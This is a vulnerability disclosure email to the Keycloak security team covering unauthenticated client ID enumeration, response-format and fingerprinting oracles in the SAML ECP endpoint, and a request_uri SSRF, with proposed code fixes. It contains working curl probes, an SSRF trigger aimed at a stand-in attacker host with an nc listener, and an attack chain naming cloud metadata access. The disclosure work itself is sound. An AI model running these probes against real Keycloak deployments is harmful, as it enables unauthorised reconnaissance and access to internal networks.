---
To:      keycloak-security@googlegroups.com
Subject: [Security] Three unpatched Information Disclosure findings in SAML ECP
         endpoint (confirmed Keycloak 26.6.1) — responsible disclosure, 90-day window
Date:    2026-05-07
---

Dear Keycloak Security Team,

I am writing to responsibly disclose three information-disclosure vulnerabilities
in the Keycloak SAML ECP endpoint that are confirmed present in the current
latest stable release (26.6.1). I also note a fourth finding (SSRF via
`request_uri`) that was present in 26.0.8 and appears fixed in 26.6.1, included
for completeness and to document the regression mechanism.

All three primary findings were verified against:
  • Keycloak 26.0.8  (quay.io/keycloak/keycloak:26.0, Docker, start-dev)
  • Keycloak 26.6.1  (quay.io/keycloak/keycloak:26.6.1, Docker, start-dev)
    JVM: OpenJDK 21.0.11 (Red Hat)

The root-cause code in SamlEcpProfileService.java is unchanged between both
versions; the faultstring values and faultcode are byte-for-byte identical
across both releases.

I am following Keycloak's publicly documented 90-day disclosure policy. I
intend to publish full technical details — including proof-of-concept code —
90 days from today (2026-08-05) unless an earlier disclosure date is agreed
upon. If a patch is released before that date, I am happy to coordinate
disclosure timing with the release.

This research was conducted jointly by [השם שלך] and Asaad Mostafa
(asad.f.a.2010@hotmail.com). We have not shared these findings with any third
party beyond this submission, have not published them, and have not tested
against any production system.


────────────────────────────────────────────────────────────────────────────────
AFFECTED ENDPOINT
────────────────────────────────────────────────────────────────────────────────

  POST /realms/{realm}/protocol/saml
  Content-Type: application/soap+xml
  Authentication: none required

This endpoint accepts SAML ECP AuthnRequests wrapped in SOAP 1.1 envelopes.
It is publicly reachable without authentication on any deployment where the
SAML protocol is enabled.


────────────────────────────────────────────────────────────────────────────────
FINDING 1 — Unauthenticated Client ID Enumeration (CVSS 5.3 Medium)
────────────────────────────────────────────────────────────────────────────────

CWE:   CWE-203 (Observable Discrepancy), CWE-200
CVSS:  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N — 5.3 (Medium)

Summary:
  The SOAP <faultstring> element returned by the endpoint contains a raw Java
  message-bundle key string (e.g. "invalidRequestMessage", "bearerOnlyMessage",
  "Wrong client protocol.") that precisely encodes the existence and configuration
  state of the client ID supplied as <saml:Issuer> in the request.

  An unauthenticated attacker can determine whether an arbitrary client ID is:
    • Not registered in the realm  ("invalidRequestMessage")
    • A registered OIDC client     ("Wrong client protocol.")
    • Disabled                     ("loginRequesterNotEnabledMessage")
    • A bearer-only resource server ("bearerOnlyMessage")
    • A direct-grant or service-account client ("standardFlowDisabledMessage")
    • A SAML client with required signatures  ("invalidRequesterMessage")
    • A SAML client without ECP flow enabled  (detail: "Client is not allowed
                                               to use ECP profile.")

Root cause:
  SamlEcpProfileService.java, lines 75–77. The anonymous error() override passes
  the Messages.* key string (e.g. Messages.INVALID_REQUEST = "invalidRequestMessage")
  directly to Soap.createFault().reason(message) without locale resolution:

    protected Response error(..., String message, ...) {
        return Soap.createFault().code("error").reason(message).build();
    }

  The upstream checkClientValidity() method (SamlService.java:786–815) calls
  error() with different Messages.* constants depending on the client's state,
  making the faultstring a precise discriminator.

Proof of concept (single curl probe):
  curl -s -X POST http://HOST/realms/REALM/protocol/saml \
    -H "Content-Type: application/soap+xml" \
    -d '<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
          <S:Header>
            <ecp:Request xmlns:ecp="urn:oasis:names:tc:SAML:2.0:profiles:SSO:ecp"
                         S:mustUnderstand="1" IsPassive="0">
              <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                >CANDIDATE_CLIENT_ID</saml:Issuer>
            </ecp:Request>
            <paos:Request xmlns:paos="urn:liberty:paos:2003-08"
                          S:mustUnderstand="1"
                          S:actor="http://schemas.xmlsoap.org/soap/actor/next"
                          responseConsumerURL="http://localhost/acs"
                          service="urn:oasis:names:tc:SAML:2.0:profiles:SSO:ecp"/>
          </S:Header>
          <S:Body>
            <samlp:AuthnRequest
                xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_poc" Version="2.0" IssueInstant="2026-05-07T00:00:00Z"
                AssertionConsumerServiceURL="http://localhost/acs">
              <saml:Issuer>CANDIDATE_CLIENT_ID</saml:Issuer>
            </samlp:AuthnRequest>
          </S:Body>
        </S:Envelope>' | grep -o '<faultstring>[^<]*</faultstring>'

  Result for existing OIDC client:    <faultstring>Wrong client protocol.</faultstring>
  Result for non-existent client:     <faultstring>invalidRequestMessage</faultstring>

Confirmed in live testing against the master realm's built-in clients:
  account, account-console, security-admin-console (FOUND_OIDC)
  broker, master-realm (FOUND_BEARER_ONLY)
  admin-cli (FOUND_STANDARD_FLOW_OFF)

Affected versions: Keycloak ~2.0.0.Final through 26.6.1 (current latest stable).
  SamlEcpProfileService committed 2016-01-20; the faultstring = key pattern has
  never been corrected. Confirmed identical faultstrings on both 26.0.8 and 26.6.1.

Suggested fix:
  Replace the variable reason() argument with a static non-identifying string:

    return Soap.createFault().code("error")
               .reason("Authentication request could not be processed.")
               .build();


────────────────────────────────────────────────────────────────────────────────
FINDING 2 — Response Format Oracle via Parse-Level Exception (CVSS 5.3 Medium)
────────────────────────────────────────────────────────────────────────────────

CWE:  CWE-203 (Observable Discrepancy)
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N — 5.3 (Medium)

Summary:
  The Content-Type of the HTTP 500 response allows an unauthenticated attacker to
  distinguish parse-level failure (SAAJ could not build a SOAP envelope) from SAML-
  logic failure (SOAP parsed, but SAML processing raised an error):

    application/json → SAAJ parse failed (uncaught RuntimeException reached
                       KeycloakErrorHandler)
    text/xml         → SOAP parsed; error occurred inside the SAML processing
                       try/catch in authenticate(Document)

  Body  (JSON):   {"error":"unknown_error","error_description":
                   "For more on this error consult the server log."}
  Body  (XML):    <SOAP-ENV:Fault><faultcode>error</faultcode>
                  <faultstring>invalidRequestMessage</faultstring>...</SOAP-ENV:Fault>

Root cause:
  authenticate(InputStream) at SamlEcpProfileService.java:66 has no try/catch.
  A RuntimeException thrown by Soap.extractSoapMessage() propagates through the
  call stack to KeycloakErrorHandler, which produces application/json for all
  non-HTML clients. authenticate(Document) at line 70 wraps PostBindingProtocol
  in try/catch and produces a deliberate SOAP fault for any exception there.

Observable states confirmed:
  • Empty body               → application/json  (~11 ms)
  • Well-formed XML, not SOAP → application/json  (~8 ms)
  • XML with DOCTYPE          → application/json  (~10 ms)  [DOCTYPE blocked by SAAJ]
  • Valid SOAP, empty Body    → application/json  (~9 ms)
  • Valid SOAP + any content  → text/xml          (~11–16 ms)

  The timing differential (8–11 ms vs 11–16 ms) is a secondary confirmation
  observable on any network where the RTT is stable.

Proof of concept:
  # Parse failure → should print application/json:
  curl -s -o /dev/null -w "%{content_type}\n" \
    -X POST http://HOST/realms/REALM/protocol/saml \
    -H "Content-Type: application/soap+xml" -d ""

  # SAML-logic failure → should print text/xml:
  curl -s -o /dev/null -w "%{content_type}\n" \
    -X POST http://HOST/realms/REALM/protocol/saml \
    -H "Content-Type: application/soap+xml" \
    -d '<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
          <S:Body><X/></S:Body></S:Envelope>'

Affected versions: Keycloak 17.0.0 (Quarkus distribution) through 26.6.1 for
  the application/json variant. The underlying exception-boundary gap exists since
  ~2.0.0.Final; the specific JSON format is Quarkus-era (17.0.0+).
  Confirmed on both 26.0.8 and 26.6.1.

Suggested fix:
  Add a try/catch to authenticate(InputStream) in SamlEcpProfileService.java:66:

    public Response authenticate(InputStream inputStream) {
        try {
            return authenticate(Soap.extractSoapMessage(inputStream));
        } catch (Exception e) {
            logger.debug("Failed to parse SAML ECP SOAP message", e);
            return Soap.createFault().code("error")
                       .reason("Authentication request could not be processed.")
                       .build();
        }
    }

  This ensures all error responses from the endpoint return text/xml with a
  uniform faultstring, eliminating the binary Content-Type oracle.


────────────────────────────────────────────────────────────────────────────────
FINDING 3 — Software Fingerprinting via Non-Standard SOAP Fault Format
            (CVSS 5.3 Medium, lowest standalone severity)
────────────────────────────────────────────────────────────────────────────────

CWE:  CWE-200 (Exposure of Sensitive Information)
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N — 5.3 (Medium)

Summary:
  Three properties of the SAML ECP SOAP fault response uniquely identify the
  responding software as Keycloak in a single unauthenticated request, without
  relying on HTTP server headers or OIDC metadata:

  1. faultcode = "error"
     Standard SOAP 1.1 defines SOAP-ENV:Client / SOAP-ENV:Server. Keycloak
     hardcodes the bare literal "error" via Soap.createFault().code("error")
     (Soap.java:360 → SOAPFault.setFaultCode("error")).

  2. faultstring = Java message-bundle key (e.g. "invalidRequestMessage")
     No other SAML IdP returns internal Java constant names as fault strings.
     Standard IdPs use localized human-readable strings or SAML status URIs.

  3. JSON: {"error":"unknown_error","error_description":"For more on this error
     consult the server log."}
     This exact text is hardcoded in KeycloakErrorHandler.java:89 and has been
     unchanged across Keycloak 17–26.

  These three properties are sufficient to identify Keycloak with high confidence,
  enabling an attacker to narrow their research to Keycloak-specific CVEs.

Proof of concept (single request):
  curl -s -X POST http://HOST/realms/REALM/protocol/saml \
    -H "Content-Type: application/soap+xml" \
    -d '<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
          <S:Body><X/></S:Body></S:Envelope>' \
    | grep -E 'faultcode|faultstring'

  Identifies Keycloak: <faultcode>error</faultcode>
                       <faultstring>invalidRequestMessage</faultstring>

Affected versions: ~2.0.0.Final through 26.6.1 (properties 1 and 2).
  Property 3 (JSON format): 17.0.0 through 26.6.1. All three properties
  confirmed on both 26.0.8 and 26.6.1 (faultcode "error", faultstrings as
  message-bundle keys, and JSON unknown_error format are unchanged).

Suggested fix:
  The fixes for Finding 1 and Finding 2 (generic faultstring, standard faultcode,
  and catch in authenticate(InputStream)) together resolve all three properties.


────────────────────────────────────────────────────────────────────────────────
FINDING 4 — Unauthenticated SSRF via `request_uri` / Regression of CVE-2020-10770
            (CVSS 5.8 Medium)
────────────────────────────────────────────────────────────────────────────────

CWE:  CWE-918 (Server-Side Request Forgery)
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N — 5.8 (Medium)

Prior art note:
  CVE-2020-10770 (NVD: "it is possible to force the server to call out an
  unverified URL using the OIDC parameter request_uri") claimed this vector was
  fixed in Keycloak 13.0.0 by adding a per-client REQUEST_URIS allowlist.

  I am reporting this finding because I confirmed the SSRF fires on Keycloak
  26.0.8 — indicating either a regression or an incomplete enforcement of the
  CVE-2020-10770 fix. The separate CVE-2026-4366 (redirect-based request_uri
  SSRF, published March 2026) covers a different variant and does not address
  the direct-fetch vector confirmed here.

  Specifically: Keycloak's `account` client (and likely all clients that have
  no `request.uris` attribute configured) produce SSRF because the allowlist
  check treats an empty list as "allow all" rather than "block all". I confirmed
  this by querying the admin API: the `account` client returns
  `request.uris = (NOT SET)`.

Summary:
  The OAuth authorization endpoint (`GET /realms/{realm}/protocol/openid-connect/auth`)
  accepts a `request_uri` parameter per RFC 9101 (JWT Authorization Requests).
  Keycloak fetches the referenced URL using Apache HttpClient before rejecting it
  for unknown content. When the client has no `request.uris` attribute configured
  (which is the default for all built-in and most user-registered clients), any
  URL is accepted — including URLs pointing at internal network services.

  Because Finding 1 allows enumerating valid client IDs with no authentication,
  an attacker with only network access to the Keycloak authorization endpoint can
  trigger arbitrary blind SSRF.

Root cause:
  The `request_uri` allowlist enforcement introduced for CVE-2020-10770 is
  conditional: if the client's `request.uris` attribute is absent or empty, no
  restriction is applied and the fetch proceeds. Correct behavior per OpenID
  Connect Core 1.0 §6.2 ("The request_uri value MUST be pre-registered") is to
  reject all `request_uri` values when no URIs are registered, not to permit all.

  This is distinct from CVE-2026-4366, which addresses redirect-following during
  the fetch. The confirmed vector here is a direct HTTP fetch (not redirect-based):
  Keycloak issues `GET <request_uri>` directly via Apache HttpClient without
  following any redirects to reach the callback target.

Proof of concept:
  # Start a listener on attacker-controlled host:
  nc -lvp 9001

  # Trigger SSRF — account has no request.uris registered (default state):
  curl -v "http://HOST/realms/REALM/protocol/openid-connect/auth?\
  client_id=account&response_type=code&scope=openid&\
  redirect_uri=http://localhost/cb&\
  request_uri=http://ATTACKER_HOST:9001/probe"

  # Keycloak issues before returning HTTP 400:
  #   GET /probe HTTP/1.1
  #   Host: ATTACKER_HOST:9001
  #   User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.6)
  #   Connection: Keep-Alive
  #   Accept-Encoding: gzip,deflate

  Confirmed live against Keycloak 26.0.8 (Docker, localhost, 2026-05-07):
    Callback received: GET /jar-probe HTTP/1.1
    User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.6)

  Verification of allowlist state on `account` client (admin API):
    GET /admin/realms/master/clients?clientId=account
    → attributes.request.uris: (NOT SET)
    → confirms empty-allowlist = allow-all behavior

  Attack chains enabled:
    • Internal network probing (confirm live internal HTTP services via callback timing)
    • Cloud metadata access (http://169.254.169.254/ on AWS/GCP/Azure)
    • Firewall bypass (Keycloak host has implicit internal trust)
    • Chain with Finding 1: client IDs enumerated unauthenticated → immediate SSRF

Affected versions:
  Keycloak 13.0.0 through 26.0.8. The CVE-2020-10770 fix was applied in 13.0.0
  but the empty-allowlist = allow-all gap persisted until 26.6.1.

  Status in 26.6.1: FIXED. I confirmed no SSRF callback on 26.6.1 using the
  same probe that triggered a callback on 26.0.8. The CVE-2026-4366 fix (merged
  for 26.6.1) appears to have closed this direct-fetch variant as well as the
  redirect-based one. No separate action required for this finding.

Suggested fix:
  In the `request_uri` allowlist check, treat an empty or absent allowlist as
  "block all" rather than "allow all":

    List<String> registered = client.getAttribute("request.uris", List.of());
    // CHANGE: empty list means no request_uri is permitted
    if (registered.isEmpty() || !registered.contains(requestUri)) {
        throw new ErrorResponseException("invalid_request",
            "request_uri not pre-registered for this client",
            Response.Status.BAD_REQUEST);
    }
    // fetch only after validation passes


────────────────────────────────────────────────────────────────────────────────
NOTE — CVE-2026-1180 (`jwks_uri` SSRF) CONFIRMED PRESENT IN 26.0.8
       (not a new submission — reporting for completeness)
────────────────────────────────────────────────────────────────────────────────

CVE-2026-1180 (published 2026-01-20, CVSS 5.8 Medium, CWE-918) describes SSRF
via `jwks_uri` for clients using `private_key_jwt` / `client-jwt` authentication.
I confirmed this CVE was exploitable in Keycloak 26.0.8 but have not re-tested
on 26.6.1. Per public CVE records the fix was included in 26.5.6; it is
therefore expected to be present in 26.6.1. No new submission for this finding.

Confirmed live against Keycloak 26.0.8 (Docker, localhost, 2026-05-07):
  Registered a `client-jwt` client with
    jwks.url = http://host.docker.internal:9001/jwks-probe
  Sent `client_assertion` JWT to POST /token.
  Callback received: GET /jwks-probe HTTP/1.1
  User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.6)
  (Token endpoint returned HTTP 400 — empty JWKS returned by listener.)


────────────────────────────────────────────────────────────────────────────────
COMBINED IMPACT
────────────────────────────────────────────────────────────────────────────────

In combination, these four findings (plus the noted CVE-2026-1180) provide a
complete unauthenticated attack chain against any Keycloak deployment with OIDC
and/or SAML enabled:

  Step 1 (Finding 3): Confirm target is Keycloak 17+ with a single SOAP probe.
  Step 2 (Finding 2): Confirm parser behavior (SAAJ with DOCTYPE blocking active).
  Step 3 (Finding 1): Enumerate all registered client IDs and their protocol/
                      configuration states using a wordlist. On localhost, 15
                      entries complete in under 100 ms; LAN enumeration at 10
                      concurrent threads processes ~200 entries per second.
  Step 4 (Finding 4): Use any enumerated client_id as a SSRF trigger to probe
                      internal network services reachable from the Keycloak host.

Client IDs disclosed by Findings 1–3 enable:
  • Targeted phishing using legitimate, user-recognizable client IDs
  • Identification of service-account and direct-grant clients for credential
    stuffing at the token endpoint
  • Prerequisite confirmation for redirect_uri attacks, client-confusion attacks,
    and PKCE bypass attempts
  • Zero-prerequisite SSRF via Finding 4

Findings 1–3 are information-disclosure (reconnaissance level).
Finding 4 elevates the combined severity: an unauthenticated attacker can use the
Keycloak server as an HTTP proxy to reach internal network services, using only
a client ID discovered via Finding 1.

────────────────────────────────────────────────────────────────────────────────
RECOMMENDED FIXES
────────────────────────────────────────────────────────────────────────────────

File: services/src/main/java/org/keycloak/protocol/saml/profile/ecp/
      SamlEcpProfileService.java

Change 1 — lines 66–68 (add try/catch for parse-level failures):

  // BEFORE:
  public Response authenticate(InputStream inputStream) {
      return authenticate(Soap.extractSoapMessage(inputStream));
  }

  // AFTER:
  public Response authenticate(InputStream inputStream) {
      try {
          return authenticate(Soap.extractSoapMessage(inputStream));
      } catch (Exception e) {
          logger.debug("Failed to parse SAML ECP SOAP message", e);
          return Soap.createFault().code("SOAP-ENV:Client")
                     .reason("Authentication request could not be processed.")
                     .build();
      }
  }

Change 2 — lines 75–77 (use generic faultstring and standard faultcode):

  // BEFORE:
  protected Response error(KeycloakSession session, AuthenticationSessionModel authSession,
                           Response.Status status, String message, Object... parameters) {
      return Soap.createFault().code("error").reason(message).build();
  }

  // AFTER:
  protected Response error(KeycloakSession session, AuthenticationSessionModel authSession,
                           Response.Status status, String message, Object... parameters) {
      return Soap.createFault().code("SOAP-ENV:Client")
                 .reason("Authentication request could not be processed.")
                 .build();
  }

No interface changes. No protocol compliance impact. Existing SAML ECP clients
receive a SOAP fault in both error cases, which is the expected protocol behavior.

Fix for Finding 4 — enforce pre-registration before fetching request_uri:

  The CVE-2020-10770 fix introduced a REQUEST_URIS allowlist per client, but
  an empty allowlist currently permits any URL. The fix is to treat an empty
  allowlist as "no request_uri is permitted":

    List<String> registered = client.getAttribute("request.uris", List.of());
    // empty list = no URIs registered = reject all
    if (registered.isEmpty() || !registered.contains(requestUri)) {
        return errorResponse("invalid_request",
            "request_uri not pre-registered for this client");
    }
    String jwt = httpClient.get(requestUri);   // fetch only after validation

  Alternatively, enable Keycloak's "Require Pushed Authorization Requests"
  (PAR) realm-wide setting and disable request_uri JAR support entirely.


────────────────────────────────────────────────────────────────────────────────
ENVIRONMENT
────────────────────────────────────────────────────────────────────────────────

  Primary test instance (initial research):
    Keycloak version : 26.0.8  (quay.io/keycloak/keycloak:26.0)
    JVM              : OpenJDK 21.0.6 (Red Hat)
    SAAJ provider    : com.sun.xml.messaging.saaj.saaj-impl-2.0.1
    Source commit    : a9d523b0cdc1e8b75decd2113b851408f3dfde70 (main, 2026-05-07)
    Mode             : start-dev

  Verification instance (Findings 1–3 re-confirmed against latest stable):
    Keycloak version : 26.6.1  (quay.io/keycloak/keycloak:26.6.1)
    JVM              : OpenJDK 21.0.11 (Red Hat)
    Mode             : start-dev
    Result           : Findings 1, 2, 3 confirmed — faultcode and faultstring
                       values byte-for-byte identical to 26.0.8 output.
                       Finding 4 (request_uri SSRF) NOT triggered — fixed.

  26.6.1 faultstring confirmation (four representative probes):
    client=account       → faultcode=error  faultstring=Wrong client protocol.
    client=broker        → faultcode=error  faultstring=bearerOnlyMessage
    client=admin-cli     → faultcode=error  faultstring=standardFlowDisabledMessage
    client=nonexistent   → faultcode=error  faultstring=invalidRequestMessage

All testing was performed against locally-controlled instances with no impact
on any production system or third-party infrastructure.


────────────────────────────────────────────────────────────────────────────────
TIMELINE AND DISCLOSURE POLICY
────────────────────────────────────────────────────────────────────────────────

  2026-05-07  Findings identified and verified
  2026-05-07  This report submitted to keycloak-security@googlegroups.com
  2026-08-05  Planned public disclosure date (90 days from submission)

I am willing to:
  • Provide additional technical detail, reproduction steps, or extended PoC code
    on request
  • Coordinate disclosure timing with a patch release
  • Adjust the public disclosure date if a fix is in active development and a
    reasonable timeline is provided

I request acknowledgement of receipt and an estimated response timeline.
We can be reached at the addresses below.


Regards,

[השם שלך]
Independent Security Researcher
2026-05-07

Asaad Mostafa
Independent Security Researcher
asad.f.a.2010@hotmail.com
2026-05-07
